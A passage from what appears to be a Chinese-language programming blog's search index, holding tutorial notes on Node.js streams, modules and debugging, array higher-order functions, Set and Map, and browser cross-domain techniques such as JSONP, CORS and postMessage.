ws.write(num + \"\"); // 需要转成字符串或者buffer才能写入 &#125; else &#123; clearInterval(time); ws.end();// 写完数据 &#125;&#125;,200)// 用事件判断是否写完数据ws.on(\"finish\", () =&gt; &#123; console.log(\"done!\");&#125;) 异步解决方案1234567891011121314151617181920212223// 异步回调 Node.js v8.0.0版本增加了util.promisify函数const fs = require(\"fs\");const promisify = require(\"util\").promisify;const read = promisify(fs.readFile); read(\"./callback.js\").then(data=&gt;&#123; console.log(data.toString());&#125;).catch(ex=&gt;&#123; console.log(ex)&#125;)// async awitasync function test() &#123; try &#123; const content = awit read(\"./callback.js\"); console.log(content.toString()) &#125; catch (ex) &#123; console.log(ex) &#125;&#125;test()","categories":[{"name":"Back-end","slug":"Back-end","permalink":"https://ru23.com/categories/Back-end/"}],"tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://ru23.com/tags/JavaScript/"},{"name":"Node","slug":"Node","permalink":"https://ru23.com/tags/Node/"}]},{"title":"Nodejs之环境&调试（二）","slug":"2017-10-node-env-debug","date":"2017-10-15T08:30:15.000Z","updated":"2018-10-24T03:46:02.201Z","comments":true,"path":"note/795a0309.html","link":"","permalink":"https://ru23.com/note/795a0309.html","excerpt":"","text":"一、环境commonJS nodejs模块管理规范 每一个文件是一个模块，有自己的作用域 在模块内部module变量代表模块本身 module.exports属性代表模块对外接口 exports与module.exports exports = module.exports exports是module.exports的快捷方式，不能修改exports的指向 12345// 这种方式修改了exports的指向，这样是不行的exports = &#123; a:\"\", b:\"\"&#125; 12345// 这样没问题module.exports = &#123; a:\"\", b:\"\"&#125; global 全局访问的属性和方法挂载到global对象中 global下的全局属性方法 commonJS Buffer、process、console timer (setInterval、setTimeout、setImmediate) process process.argv 参数相关的东西 argv argv0是argv的第一个参数 execArgv是调用node所传入的一些参数 如node --inspect test.js exevPath调用脚本的路径 C:\\Program Files\\nodejs\\node.exe &gt;node test3.js a=1 a=2 a=3 a=4执行的时候，传入一些外部的命令 1234567const &#123;argv, argv0, execArgv, exevPath&#125; = process;argv.forEach(item =&gt; &#123; console.log(item); //C:\\Program Files\\nodejs\\node.exe //C:\\Users\\Administrator\\Desktop\\learn_node\\test3.js&#125;) process.env 1const &#123;env&#125; = process; process.cwd 打印当前路径 1C:\\Users\\Administrator\\Desktop\\learn_node process.nextTick与setImmediate 执行速度： nextTick &gt; setTimeout &gt; setImmediate nextTick在异步之前执行 12345678910111213141516// nextTick比setImmediate执行得早process.nextTick(()=&gt;&#123; // 当前事件队列执行完之后再执行 console.log(\"nextTick\") &#125;)setTimeout(()=&gt;&#123; console.log(\"setTimeout\")&#125;)// 在大部分情况下使用setImmediate就行setImmediate(()=&gt;&#123; console.log(\"setImmediate\")&#125;)//nextTick//setImmediate 二、调试 官方调试方法 https://nodejs.org/en/docs/inspector/ 方法一：使用inspect Option 1: Open chrome://inspect in a Chromium-based browser. Click the Configure button and ensure your target host and port are listed. Then select your Node.js app from the list Option 2: Install the ChromeExtension NIM (Node Inspector Manager): https://chrome.google.com/webstore/detail/nim-node-inspector-manage/gnhhdgbaldcilmgcpfddgdbkhjohddkj 方法二：使用VS code","categories":[{"name":"Back-end","slug":"Back-end","permalink":"https://ru23.com/categories/Back-end/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"https://ru23.com/tags/Javascript/"},{"name":"Node","slug":"Node","permalink":"https://ru23.com/tags/Node/"}]},{"title":"Nodejs之简单入门（一）","slug":"2017-10-learn-node-start","date":"2017-10-15T03:40:43.000Z","updated":"2018-10-24T03:46:02.195Z","comments":true,"path":"note/93337fcf.html","link":"","permalink":"https://ru23.com/note/93337fcf.html","excerpt":"","text":"一、前言 nodejs是事件驱动、非阻塞I/O模型 阻塞：i/o时进程休眠等待完成后进行下一步 非阻塞：i/o时函数立即返回，进程不等待i/o返回 i/o完成后通知主程序，如何告诉呢？通过事件驱动 事件驱动 i/o等异步操作结束后通知 内部实现是观察者模式 CPU密集和I/O密集 CPU密集：压缩、解压、加密、解密 I/O密集：文件操作、网络操作、数据库 web常见场景(web是一个I/O密集) 静态资源读取 数据库操作 渲染页面 高并发应用之道 增加机器数 增加每台机器CPU数-多核 image.png 进程、线程 进程：一个运行的程序（进程包括线程，如何水分子里面还有分子原子） 线程：进程内一个独立的，可调度的执行单元 多线程：启动一个进程，在一个进程内启动多个线程，这样多个线程可以执行多个任务 Nodejs的单线程 单线程只是针对主进程，I/O操作系统底层多线程调度 单线程并不是单进程 Nodejs原理 Node是单线程的，只开一个进程，一个进程也只开一个线程。一个CPU上只开一个进程，一个进程里面只有一个线程 nodejs高性能的前提 高并发 I/O密集 常用场景 web Server 本地代码构建 (webpack/grunt/gulp) 使用工具的开发 二、nodejs与JavaScrip异同 ECMAScript 语法 内置对象、方法 顶层对象 JavaScript：window nodejs: global 在ECMA部分node和JavaScript是一样的，比如数据类型的定义，语法结构、内置对象 三、模块 在node中文件和模块是一一对应的，也就是一个文件一个模块。file是每个模块下必有的一个属性，输出文件的绝对路径。`dirname` 是文件夹名称绝对路径 每个模块都有自己的作用域 我们通过var声明的变量并非全局，而是该模块作用域下的 模块加载机制 require加载模块 1、首先按照加载模块的文件名称进行查找 2、如果没有找到就会在文件模块文件名称后加载.js进行查找 3、如果还没有找到，就在文件名称后加载.json后缀，进行查找 4、如果还没找到，就会在文件名称后加上.node进行查找 查找流程：文件名称-&gt;.js -&gt; .json-&gt;.node exports、module 保存当前模块有关的一些信息 module.exports 一般使用这个,把一个模块中的变量对外提供访问 在模块作用域，还有一个内置的模块对象，exports其实就是module.exports,他们两个都是指向同一个对象 四、node目录的配置 配置文件 : package.json dependencies : 当前项目所使用到的依赖模块 安装方式: npm install 自动读取package.json自动安装 router目录 用来存放路由文件 views目录 用来存放html模板文件 module目录 自己写的一些模块 五、第一个node服务器12345678910111213// 安装好node就有的一个模块// 用来创建http服务器的const http = require(`http`);http.createServer((request,response) =&gt; &#123; //request 请求对象 浏览器 请求 服务器所有的内容保存在这个对象里 //response 响应对象 服务器响应浏览器 所有的方法 response.writeHead(200 , &#123; 'Content-Type':'text/html' &#125; ); // .end() 结束响应 同时发送一个 Hello Word response.end('Hello Word')&#125;).listen(233);//.listen(); 监听端口 233 自定义的端口号// 如果开启了node服务器 修改完之后的代码必须 重启才能生效","categories":[{"name":"Back-end","slug":"Back-end","permalink":"https://ru23.com/categories/Back-end/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"https://ru23.com/tags/Javascript/"},{"name":"Node","slug":"Node","permalink":"https://ru23.com/tags/Node/"}]},{"title":"高阶函数map reduce filter","slug":"2017-10-map-reduce-filter","date":"2017-09-17T09:33:00.000Z","updated":"2018-10-24T03:46:02.197Z","comments":true,"path":"note/6ef2cf5a.html","link":"","permalink":"https://ru23.com/note/6ef2cf5a.html","excerpt":"","text":"整理于互联网 map 由于map()方法定义在JavaScript的Array中，我们调用Array的map()方法，传入我们自己的函数，就得到了一个新的Array作为结果 123456function pow(x) &#123; return x * x;&#125;var arr = [1, 2, 3, 4, 5, 6, 7, 8, 9];arr.map(pow); // [1, 4, 9, 16, 25, 36, 49, 64, 81] map()传入的参数是pow，即函数对象本身 map()作为高阶函数，事实上它把运算规则抽象了，因此，我们不但可以计算简单的f(x)=x2，还可以计算任意复杂的函数，比如，把Array的所有数字转为字符串 12var arr = [1, 2, 3, 4, 5, 6, 7, 8, 9];arr.map(String); // ['1', '2', '3', '4', '5', '6', '7', '8', '9'] reduce 再看reduce的用法。Array的reduce()把一个函数作用在这个Array的[x1, x2, x3...]上，这个函数必须接收两个参数，reduce()把结果继续和序列的下一个元素做累积计算，其效果就是： 1[x1, x2, x3, x4].reduce(f) = f(f(f(x1, x2), x3), x4) 比方说对一个Array求和，就可以用reduce实现 1234var arr = [1, 3, 5, 7, 9];arr.reduce(function (x, y) &#123; return x + y;&#125;); // 25 要把[1, 3, 5, 7, 9]变换成整数13579，reduce()也能派上用场 1234var arr = [1, 3, 5, 7, 9];arr.reduce(function (x, y) &#123; return x * 10 + y;&#125;); // 13579 filter filter也是一个常用的操作，它用于把Array的某些元素过滤掉，然后返回剩下的元素 和map()类似，Array的filter()也接收一个函数。和map()不同的是，filter()把传入的函数依次作用于每个元素，然后根据返回值是true还是false决定保留还是丢弃该元素 例如，在一个Array中，删掉偶数，只保留奇数，可以这么写： 12345var arr = [1, 2, 4, 5, 6, 9, 10, 15];var r = arr.filter(function (x) &#123; return x % 2 !== 0;&#125;);r; // [1, 5, 9, 15] 把一个Array中的空字符串删掉，可以这么写： 12345var arr = ['A', '', 'B', null, undefined, 'C', ' '];var r = arr.filter(function (s) &#123; return s &amp;&amp; s.trim(); // 注意：IE9以下的版本没有trim()方法&#125;);r; // ['A', 'B', 'C'] 可见用filter()这个高阶函数，关键在于正确实现一个“筛选”函数 回调函数 filter()接收的回调函数，其实可以有多个参数。通常我们仅使用第一个参数，表示Array的某个元素。回调函数还可以接收另外两个参数，表示元素的位置和数组本身： 1234567var arr = ['A', 'B', 'C'];var r = arr.filter(function (element, index, self) &#123; console.log(element); // 依次打印'A', 'B', 'C' console.log(index); // 依次打印0, 1, 2 console.log(self); // self就是变量arr return true;&#125;); 利用filter，可以巧妙地去除Array的重复元素 12345var r;var arr = ['apple', 'strawberry', 'banana', 'pear', 'apple', 'orange', 'orange', 'strawberry'];r = arr.filter(function (element, index, self) &#123; return self.indexOf(element) === index;&#125;); 去除重复元素依靠的是indexOf总是返回第一个元素的位置，后续的重复元素位置与indexOf返回的位置不相等，因此被filter滤掉了 用filter()筛选出素数 123456789arr.filter(function t(element,index,self)&#123; for(var i=2;i&lt;element;i++)&#123; if(element%i === 0) break; &#125; if(element === i) return true; else return false;&#125;); sort 排序也是在程序中经常用到的算法。无论使用冒泡排序还是快速排序，排序的核心是比较两个元素的大小。如果是数字，我们可以直接比较，但如果是字符串或者两个对象呢？直接比较数学上的大小是没有意义的，因此，比较的过程必须通过函数抽象出来。通常规定，对于两个元素x和y，如果认为x &lt; y，则返回-1，如果认为x == y，则返回0，如果认为x &gt; y，则返回1，这样，排序算法就不用关心具体的比较过程，而是根据比较结果直接排序 JavaScript的Array的sort()方法就是用于排序的，但是排序结果可能让你大吃一惊： 12345678// 看上去正常的结果:['Google', 'Apple', 'Microsoft'].sort(); // ['Apple', 'Google', 'Microsoft'];// apple排在了最后:['Google', 'apple', 'Microsoft'].sort(); // ['Google', 'Microsoft\", 'apple']// 无法理解的结果:[10, 20, 1, 2].sort(); // [1, 10, 2, 20] Array的sort()方法默认把所有元素先转换为String再排序，结果&#39;10&#39;排在了&#39;2&#39;的前面，因为字符&#39;1&#39;比字符&#39;2&#39;的ASCII码小 如果不知道sort()方法的默认排序规则，直接对数字排序，绝对栽进坑里！ 幸运的是，sort()方法也是一个高阶函数，它还可以接收一个比较函数来实现自定义的排序 要按数字大小排序，我们可以这么写 12345678910var arr = [10, 20, 1, 2];arr.sort(function (x, y) &#123; if (x &lt; y) &#123; return -1; &#125; if (x &gt; y) &#123; return 1; &#125; return 0;&#125;); // [1, 2, 10, 20] 如果要倒序排序，我们可以把大的数放前面： 12345678910var arr = [10, 20, 1, 2];arr.sort(function (x, y) &#123; if (x &lt; y) &#123; return 1; &#125; if (x &gt; y) &#123; return -1; &#125; return 0;&#125;); // [20, 10, 2, 1] 默认情况下，对字符串排序，是按照ASCII的大小比较的，现在，我们提出排序应该忽略大小写，按照字母序排序。要实现这个算法，不必对现有代码大加改动，只要我们能定义出忽略大小写的比较算法就可以： 123456789101112var arr = ['Google', 'apple', 'Microsoft'];arr.sort(function (s1, s2) &#123; x1 = s1.toUpperCase(); x2 = s2.toUpperCase(); if (x1 &lt; x2) &#123; return -1; &#125; if (x1 &gt; x2) &#123; return 1; &#125; return 0;&#125;); // ['apple', 'Google', 'Microsoft'] 忽略大小写来比较两个字符串，实际上就是先把字符串都变成大写（或者都变成小写），再比较 最后友情提示，sort()方法会直接对Array进行修改，它返回的结果仍是当前Array 12345var a1 = ['B', 'A', 'C'];var a2 = a1.sort();a1; // ['A', 'B', 'C']a2; // ['A', 'B', 'C']a1 === a2; // true, a1和a2是同一对象","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://ru23.com/tags/JavaScript/"},{"name":"高阶函数","slug":"高阶函数","permalink":"https://ru23.com/tags/高阶函数/"}]},{"title":"Set与Map","slug":"2017-09-set-map","date":"2017-09-17T06:33:00.000Z","updated":"2018-10-24T03:46:02.144Z","comments":true,"path":"note/d9bfddfa.html","link":"","permalink":"https://ru23.com/note/d9bfddfa.html","excerpt":"","text":"Map Map是一组键值对的结构，具有极快的查找速度 用Map实现，只需要一个“名字”-“成绩”的对照表，直接根据名字查找成绩，无论这个表有多大，查找速度都不会变慢。用JavaScript写一个Map如下： 12var m = new Map([['Michael', 95], ['Bob', 75], ['Tracy', 85]]);m.get('Michael'); // 95 初始化Map需要一个二维数组，或者直接初始化一个空Map。Map具有以下方法 1234567var m = new Map(); // 空Mapm.set('Adam', 67); // 添加新的key-valuem.set('Bob', 59);m.has('Adam'); // 是否存在key 'Adam': truem.get('Adam'); // 67m.delete('Adam'); // 删除key 'Adam'm.get('Adam'); // undefined 由于一个key只能对应一个value，所以，多次对一个key放入value，后面的值会把前面的值冲掉 1234var m = new Map();m.set('Adam', 67);m.set('Adam', 88);m.get('Adam'); // 88 Set Set和Map类似，也是一组key的集合，但不存储value。由于key不能重复，所以，在Set中，没有重复的key 要创建一个Set，需要提供一个Array作为输入，或者直接创建一个空Set 12var s1 = new Set(); // 空Setvar s2 = new Set([1, 2, 3]); // 含1, 2, 3 重复元素在Set中自动被过滤 12var s = new Set([1, 2, 3, 3, '3']);s; // Set &#123;1, 2, 3, \"3\"&#125; 通过add(key)方法可以添加元素到Set中，可以重复添加，但不会有效果 123456&gt;&gt;&gt; s.add(4)&gt;&gt;&gt; s&#123;1, 2, 3, 4&#125;&gt;&gt;&gt; s.add(4)&gt;&gt;&gt; s&#123;1, 2, 3, 4&#125; 通过delete(key)方法可以删除元素 1234var s = new Set([1, 2, 3]);s; // Set &#123;1, 2, 3&#125;s.delete(3);s; // Set &#123;1, 2&#125; 小结 Map和Set是ES6标准新增的数据类型，请根据浏览器的支持情况决定是否要使用","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"https://ru23.com/tags/Javascript/"},{"name":"ES6","slug":"ES6","permalink":"https://ru23.com/tags/ES6/"}]},{"title":"web开发中跨域解决方案","slug":"2017-09-cross-domain","date":"2017-09-17T03:40:43.000Z","updated":"2018-10-24T03:46:02.139Z","comments":true,"path":"note/b28c200f.html","link":"","permalink":"https://ru23.com/note/b28c200f.html","excerpt":"","text":"什么是跨域？ 概念如下：只要协议、域名、端口有任何一个不同，都被当作是不同的域 下面是具体的跨域情况详解 URL 说明 是否允许通信 http://www.a.com/a.js、http://www.a.com/b.js 同一域名下 允许 http://www.a.com/lab/a.js、http://www.a.com/script/b.js 同一域名下不同文件夹 允许 http://www.a.com:8000/a.js、http://www.a.com/b.js 同一域名，不同端口 不允许 http://www.a.com/a.js、https://www.a.com/b.js 同一域名，不同协议 不允许 http://www.a.com/a.js、http://70.32.92.74/b.js 域名和域名对应ip 不允许 http://www.a.com/a.js、http://script.a.com/b.js 主域相同，子域不同 不允许（cookie这种情况下也不允许访问） http://www.a.com/a.js、http://a.com/b.js 同一域名，不同二级域名（同上） 不允许（cookie这种情况下也不允许访问） http://www.cnblogs.com/a.js、http://www.a.com/b.js 不同域名 不允许 一、document.domain跨域 原理：相同主域名不同子域名下的页面，可以设置document.domain让它们同域 限制：同域document提供的是页面间的互操作，需要载入iframe页面 下面几个域名下的页面都是可以通过document.domain跨域互操作的： http://a.com/foo, http://b.a.com/bar, http://c.a.com/bar。 但只能以页面嵌套的方式来进行页面互操作，比如常见的iframe方式就可以完成页面嵌套 12345678910// URL http://a.com/foovar ifr = document.createElement('iframe');ifr.src = 'http://b.a.com/bar'; ifr.onload = function()&#123; var ifrdoc = ifr.contentDocument || ifr.contentWindow.document; ifrdoc.getElementsById(\"foo\").innerHTML);&#125;;ifr.style.display = 'none';document.body.appendChild(ifr); 上述代码所在的URL是http://a.com/foo，它对http://b.a.com/bar的DOM访问要求后者将 document.domain往上设置一级 12// URL http://b.a.com/bardocument.domain = 'a.com' document.domain只能从子域设置到主域，往下设置以及往其他域名设置都是不允许的， 在Chrome中给出的错误是这样的 1Uncaught DOMException: Failed to set the 'domain' property on 'Document': 'baidu.com' is not a suffix of 'b.a.com' 二、有src的标签 原理：所有具有src属性的HTML标签都是可以跨域的，包括&lt;img&gt;, &lt;script&gt; 限制：需要创建一个DOM对象，只能用于GET方法 在document.body中append一个具有src属性的HTML标签， src属性值指向的URL会以GET方法被访问，该访问是可以跨域的 其实样式表的&lt;link&gt;标签也是可以跨域的，只要是有src或href的HTML标签都有跨域的能力 不同的HTML标签发送HTTP请求的时机不同，例如&lt;img&gt;在更改src属性时就会发送请求，而script, iframe, link[rel=stylesheet]只有在添加到DOM树之后才会发送HTTP请求： 12345var img = new Image();img.src = 'http://some/picture'; // 发送HTTP请求var ifr = $('&lt;iframe&gt;', &#123;src: 'http://b.a.com/bar'&#125;);$('body').append(ifr); // 发送HTTP请求 三、JSONP 原理：&lt;script&gt;是可以跨域的，而且在跨域脚本中可以直接回调当前脚本的函数 限制：需要创建一个DOM对象并且添加到DOM树，只能用于GET方法 JSONP利用的是&lt;script&gt;可以跨域的特性，跨域URL返回的脚本不仅包含数据，还包含一个回调 123456// URL: http://b.a.com/foovar data = &#123; foo: 'bar', bar: 'foo'&#125;;callback(data); 然后在我们在主站http://a.com中，可以这样来跨域获取http://b.a.com的数据： 123456// URL: http://a.com/foovar callback = function(data)&#123; // 处理跨域请求得到的数据&#125;;var script = $('&lt;script&gt;', &#123;src: 'http://b.a.com/bar'&#125;);$('body').append(script); 其实jQuery已经封装了JSONP的使用，我们可以这样来 123$.getJSON( \"http://b.a.com/bar?callback=callback\", function( data )&#123; // 处理跨域请求得到的数据&#125;); $.getJSON与$.get的区别是前者会把responseText转换为JSON，而且当URL具有callback参数时， jQuery将会把它解释为一个JSONP请求，创建一个&lt;script&gt;标签来完成该请求 四、navigation 对象 原理：iframe之间是共享navigator对象的，用它来传递信息 要求：IE6/7 有些人注意到了IE6/7的一个漏洞：iframe之间的window.navigator对象是共享的。 我们可以把它作为一个Messenger，通过它来传递信息。比如一个简单的委托： 123456// a.comnavigation.onData()&#123; // 数据到达的处理函数&#125;typeof navigation.getData === 'function' || navigation.getData() 12345678// b.comnavigation.getData = function()&#123; $.get('/path/under/b.com') .success(function(data)&#123; typeof navigation.onData === 'function' || navigation.onData(data) &#125;);&#125; 与document.navigator类似，window.name也是当前窗口所有页面所共享的。也可以用它来传递信息。 同样蛋疼的办法还有传递Hash（有些人叫锚点），这是因为每次浏览器打开一个URL时，URL后面的#xxx部分会保留下来，那么新的页面可以从这里获得上一个页面的数据 五、跨域资源共享（CORS） 原理：服务器设置Access-Control-Allow-OriginHTTP响应头之后，浏览器将会允许跨域请求 限制：浏览器需要支持HTML5，可以支持POST，PUT等方法 前面提到的跨域手段都是某种意义上的Hack， HTML5标准中提出的跨域资源共享（Cross Origin Resource Share，CORS）才是正道。 它支持其他的HTTP方法如PUT, POST等，可以从本质上解决跨域问题。 例如，从http://a.com要访问http://b.com的数据，通常情况下Chrome会因跨域请求而报错 1XMLHttpRequest cannot load http://b.com. No 'Access-Control-Allow-Origin' header is present on the requested resource. Origin 'http://a.com' is therefore not allowed access 错误原因是被请求资源没有设置Access-Control-Allow-Origin，所以我们在b.com的服务器中设置这个响应头字段即可 12Access-Control-Allow-Origin: * # 允许所有域名访问，或者Access-Control-Allow-Origin: http://a.com # 只允许所有域名访问 六、window.postMessage 原理：HTML5允许窗口之间发送消息 限制：浏览器需要支持HTML5，获取窗口句柄后才能相互通信 这是一个安全的跨域通信方法，postMessage(message,targetOrigin)也是HTML5引入的特性。 可以给任何一个window发送消息，不论是否同源。第二个参数可以是*但如果你设置了一个URL但不相符，那么该事件不会被分发。看一个普通的使用方式吧 123// URL: http://a.com/foovar win = window.open('http://b.com/bar');win.postMessage('Hello, bar!', 'http://b.com'); 1234// URL: http://b.com/barwindow.addEventListener('message',function(event) &#123; console.log(event.data);&#125;); 七、访问控制安全的讨论 在HTML5之前，JSONP已经成为跨域的事实标准了，jQuery都给出了支持。 值得注意的是它只是Hack，并没有产生额外的安全问题。 因为JSONP要成功获取数据，需要跨域资源所在服务器的配合，比如资源所在服务器需要自愿地回调一个合适的函数，所以服务器仍然有能力控制资源的跨域访问 跨域的正道还是要使用HTML5提供的CORS头字段以及window.postMessage， 可以支持POST, PUT等HTTP方法，从机制上解决跨域问题。 值得注意的是Access-Control-Allow-Origin头字段是资源所在服务器设置的， 访问控制的责任仍然是在提供资源的服务器一方，这和JSONP是一样的","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://ru23.com/tags/JavaScript/"},{"name":"跨域","slug":"跨域","permalink":"https://ru23.com/tags/跨域/"}]},{"title":"JS计算字符串所占字节数","slug":"2017-09-js-calc-str-byte","date":"2017-09-12T11:40:43.000Z","updated":"2018-10-24T03:46:02.141Z","comments":true,"path":"note/79d4a191.html","link":"","permalink":"https://ru23.com/note/79d4a191.html","excerpt":"","text":"123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354/** * 计算字符串所占的内存字节数，默认使用UTF-8的编码方式计算，也可制定为UTF-16 * UTF-8 是一种可变长度的 Unicode 编码格式，使用一至四个字节为每个字符编码 * * 000000 - 00007F(128个代码) 0zzzzzzz(00-7F) 一个字节 * 000080 - 0007FF(1920个代码) 110yyyyy(C0-DF) 10zzzzzz(80-BF) 两个字节 * 000800 - 00D7FF 00E000 - 00FFFF(61440个代码) 1110xxxx(E0-EF) 10yyyyyy 10zzzzzz 三个字节 * 010000 - 10FFFF(1048576个代码) 11110www(F0-F7) 10xxxxxx 10yyyyyy 10zzzzzz 四个字节 * * 注: Unicode在范围 D800-DFFF 中不存在任何字符 * &#123;@link http://zh.wikipedia.org/wiki/UTF-8&#125; * * UTF-16 大部分使用两个字节编码，编码超出 65535 的使用四个字节 * 000000 - 00FFFF 两个字节 * 010000 - 10FFFF 四个字节 * * &#123;@link http://zh.wikipedia.org/wiki/UTF-16&#125; * @param &#123;String&#125; str * @param &#123;String&#125; charset utf-8, utf-16 * @return &#123;Number&#125; */ var sizeof = function(str, charset)&#123; var total = 0, charCode, i, len; charset = charset ? charset.toLowerCase() : ''; if(charset === 'utf-16' || charset === 'utf16')&#123; for(i = 0, len = str.length; i &lt; len; i++)&#123; charCode = str.charCodeAt(i); if(charCode &lt;= 0xffff)&#123; total += 2; &#125;else&#123; total += 4; &#125; &#125; &#125;else&#123; for(i = 0, len = str.length; i &lt; len; i++)&#123; charCode = str.charCodeAt(i); if(charCode &lt;= 0x007f) &#123; total += 1; &#125;else if(charCode &lt;= 0x07ff)&#123; total += 2; &#125;else if(charCode &lt;= 0xffff)&#123; total += 3; &#125;else&#123; total += 4; &#125; &#125; &#125; return total; &#125;","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"https://ru23.com/tags/Javascript/"}]},{"title":"iframe+表单跨域提交POST请求","slug":"2017-09-js-post","date":"2017-09-04T01:30:43.000Z","updated":"2018-10-24T03:46:02.143Z","comments":true,"path":"note/2d05014a.html","link":"","permalink":"https://ru23.com/note/2d05014a.html","excerpt":"","text":"虚拟表单的形式提交post请求 现需要把数据源解析提交到表单，创建一个隐藏的表单、隐藏的iframe,表单的target指向iframe的name 1var str = &apos;hfrom_handle=206438&amp;dnid=&amp;dgroup_items__x_countz_=1&amp;dgroup_items=1&amp;dgroup_items_group=dl%2ets&amp;dgroup_items_mirror_count=1&amp;dgroup_items_flags__x_countz_=1&amp;dgroup_items_flags=4&amp;dgroup_items_keys__x_countz_=1&amp;dgroup_items_keys=1jfiegbp3oyma&amp;dgroup_items_tokens__x_countz_=1&amp;dgroup_items_tokens=123456&amp;dgroup_items_datas__x_countz_=1&amp;dgroup_items_datas=&#123;%22key%22%3a%221jfiegbp3oyma%22,%22type%22%3a%22test%2epcba%22,%22time%22%3a%2220170904004724%2e838%22,%22g%22%3a[&#123;%22n%22%3a%22mfc%22,%22p%22%3a[&#123;%22n%22%3a%22factory%22,%22v%22%3a%22%22&#125;,&#123;%22n%22%3a%22operator%22,%22v%22%3a%22xiaoming%22&#125;,&#123;%22n%22%3a%22work%2eorder%22,%22v%22%3a%221889%22&#125;,&#123;%22n%22%3a%22materal%2ecode%22,%22v%22%3a%22%22&#125;,&#123;%22n%22%3a%22materal%2edesc%22,%22v%22%3a%22%22&#125;]&#125;,&#123;%22n%22%3a%22env%22,%22p%22%3a[&#123;%22n%22%3a%22dev%2ehardware%2ecpu%2emodel%22,%22v%22%3a%22gm8136%22&#125;,&#123;%22n%22%3a%22dev%2ehardware%2emodel%22,%22v%22%3a%22f127%22&#125;,&#123;%22n%22%3a%22dev%2ehardware%2esensor%2emodel%22,%22v%22%3a%22soih42%22&#125;,&#123;%22n%22%3a%22dev%2ehardware%2ewifi%2emac%22,%22v%22%3a%2228%3af3%3a66%3a1c%3aac%3a30%22&#125;,&#123;%22n%22%3a%22dev%2ehardware%2ewifi%2emodel%22,%22v%22%3a%22rtl8188%22&#125;,&#123;%22n%22%3a%22dev%2eversion%2ecurrent%22,%22v%22%3a%22v4%2e8%2e1%2e1708141702%22&#125;,&#123;%22n%22%3a%22vtest%5fver%22,%22v%22%3a%224%2e8%2e1%2e1708031358%22&#125;,&#123;%22n%22%3a%22dev%2eversion%2ebase%22,%22v%22%3a%22v3%2e3%2e2%2e1603301301%22&#125;,&#123;%22n%22%3a%22pc%2eip%2epublic%22,%22v%22%3a%22120%2e236%2e230%2e234%22&#125;,&#123;%22n%22%3a%22pc%2eip%2eprivate%22,%22v%22%3a%22192%2e168%2e3%2e180%22&#125;]&#125;,&#123;%22n%22%3a%22appearance%22,%22p%22%3a[&#123;%22n%22%3a%22result%22,%22v%22%3a%22ok%22&#125;,&#123;%22n%22%3a%22duration%22,%22v%22%3a%221605ms%22&#125;]&#125;,&#123;%22n%22%3a%22wifi%5fsignal%22,%22p%22%3a[&#123;%22n%22%3a%22quality%22,%22v%22%3a%2284%22&#125;,&#123;%22n%22%3a%22ssid%22,%22v%22%3a%22HW11%22&#125;,&#123;%22n%22%3a%22result%22,%22v%22%3a%22ok%22&#125;]&#125;,&#123;%22n%22%3a%22activate%22,%22p%22%3a[&#123;%22n%22%3a%22result%22,%22v%22%3a%22ccm%2esecurity%5fchip%2eactived%22&#125;,&#123;%22n%22%3a%22code%22,%22v%22%3a%22%22&#125;]&#125;]&#125;&amp;dgroup_items_offsets__x_countz_=1&amp;dgroup_items_offsets=0&apos; 解码后的数据 image.png 创建一个隐藏的input(type=&quot;hidden&quot;),然后把解码得到的数据处理填充到input的name value中，最后通过表单提交到iframe，此过程提交不会刷新页面 1234567891011121314151617181920212223242526/*iframe post cross domain*/ function js_iframe(c) &#123; var i, e, key, n, v, inp, a, form, iframe; // 原理：创建一个隐藏的form、一个隐藏的iframe,把表单的target指向iframe的name即可 form = document.createElement(\"form\"); iframe = document.createElement(\"iframe\"); iframe.style.display = \"none\"; iframe.name = \"frame_post\"; document.body.appendChild(iframe); form.action = url; form.target = \"frame_post\"; form.method = \"post\"; form.style.display = \"none\"; for(i = 0, a = (decodeURIComponent(str)).split(\"&amp;\");i&lt;a.length;i++) &#123; inp = document.createElement(\"input\"); e = a[i].split(\"=\") inp.type = \"hidden\"; inp.name = e[0]; inp.value = e[1]; form.appendChild(inp); &#125; document.body.appendChild(form); form.submit(); &#125; 提交后表单处理的结果是这样： image.png","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"https://ru23.com/tags/Javascript/"},{"name":"跨域","slug":"跨域","permalink":"https://ru23.com/tags/跨域/"}]},{"title":"浅谈JavaScript中的异步处理","slug":"2017-08-js-cb-promise-generator-async","date":"2017-08-27T03:40:43.000Z","updated":"2018-10-24T03:46:02.135Z","comments":true,"path":"note/fb0e9d3a.html","link":"","permalink":"https://ru23.com/note/fb0e9d3a.html","excerpt":"","text":"整理于互联网 在JavaScript的世界中，所有代码都是单线程执行的 由于这个“缺陷”，导致JavaScript的所有网络操作，浏览器事件，都必须是异步执行。异步执行可以用回调函数实现 异步操作会在将来的某个时间点触发一个函数调用 主流的异步处理方案主要有：回调函数(CallBack)、Promise、Generator函数、async/await。 一、回调函数(CallBack) 这是异步编程最基本的方法 假设我们有一个 getData 方法，用于异步获取数据，第一个参数为请求的 url 地址，第二个参数是回调函数，如下： 123456789101112function getData (url, callBack) &#123; // 模拟发送网络请求 setTimeout(() =&gt; &#123; // 假设 res 就是返回的数据 var res = &#123; url: url, data: Math.random() &#125; // 执行回调，将数据作为参数传递 callBack(res) &#125;, 1000)&#125; 我们预先设定一个场景，假设我们要请求三次服务器，每一次的请求依赖上一次请求的结果，如下： 123456789getData('/page/1?param=123', (res1) =&gt; &#123; console.log(res1) getData(`/page/2?param=$&#123;res1.data&#125;`, (res2) =&gt; &#123; console.log(res2) getData(`/page/3?param=$&#123;res2.data&#125;`, (res3) =&gt; &#123; console.log(res3) &#125;) &#125;)&#125;) 通过上面的代码可以看出，第一次请求的 url 地址为：/page/1?param=123，返回结果为 res1。 